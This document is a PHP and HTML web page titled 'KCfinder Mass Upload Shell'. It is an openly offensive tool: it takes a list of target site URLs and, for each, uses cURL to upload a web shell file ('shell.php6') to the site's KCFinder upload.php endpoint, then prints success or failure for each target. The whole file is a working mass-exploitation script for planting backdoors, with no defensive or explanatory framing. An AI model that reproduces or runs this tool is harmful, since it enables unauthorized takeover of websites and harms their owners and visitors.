<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="style.css">

    <title>KCfinder Mass Upload Shell</title>
  </head>
  <body>

<div class="container-fluid">
<br><br><br>
    <h1>KCfinder Mass Upload Shell</h1>
 <br>
<center>
    <form>
  <div class="form-group">
    <label for="exampleInputEmail1">Url Target :</label><br>
    <textarea cols="55" id="ContactForm1_contact-form-email-message" name="url" placeholder="http://target.co/(patch)" rows="6"></textarea>

    <br><br>
  <button type="submit"  class="btn btn-primary">Submit</button>
</form>
</center>


<?php

if(isset($_GET['url'])){

    $url = $_GET['url'];
    $lis = explode("\n", $url);
    
    foreach($lis as $ht){
    
$target = "$ht/kcfinder/upload.php";           
$shell = 'shell.php6';   
$file = new CURLFile(realpath($shell));
$up = array (
        'file' => $file
              );    

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible;)");   
    curl_setopt($ch, CURLOPT_HTTPHEADER,array('Content-Type: multipart/form-data'));
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1);   
    curl_setopt($ch, CURLOPT_FORBID_REUSE, 1);  
    curl_setopt($ch, CURLOPT_TIMEOUT, 100);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $up);

    $result = curl_exec ($ch);

    if ($result === FALSE) {

        echo '<font color="#FF0000" Gagal Upload ' . $shell .  " " . curl_error($ch);
        curl_close ($ch);

    }else{
        curl_close ($ch);
        echo '<font color="#008000"> [+] ' .$ht.$result. '</font>';
        echo "\n\n";

    }
    
    }
}
?>



</div>



    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
  </body>
</html>